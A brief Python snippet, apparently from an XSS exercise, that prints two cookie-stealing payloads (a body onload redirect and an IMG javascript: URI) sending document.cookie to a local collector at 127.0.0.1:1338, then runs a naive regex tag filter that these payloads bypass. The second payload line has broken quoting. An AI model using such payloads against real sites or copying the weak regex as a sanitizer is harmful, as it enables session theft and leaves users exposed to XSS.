import re

comment = '<body onload=\'document.location="http://127.0.0.1:1338/xss/2?cookie=" + document.cookie\'>'
comment = '<IMG SRC="javascript:window.open('http://127.0.0.1:1338/xss/2?cookie=' + document.cookie);">'
print(comment)
comment = re.sub(r'<[a-z]*>', '', comment, flags=re.IGNORECASE)
print(comment)
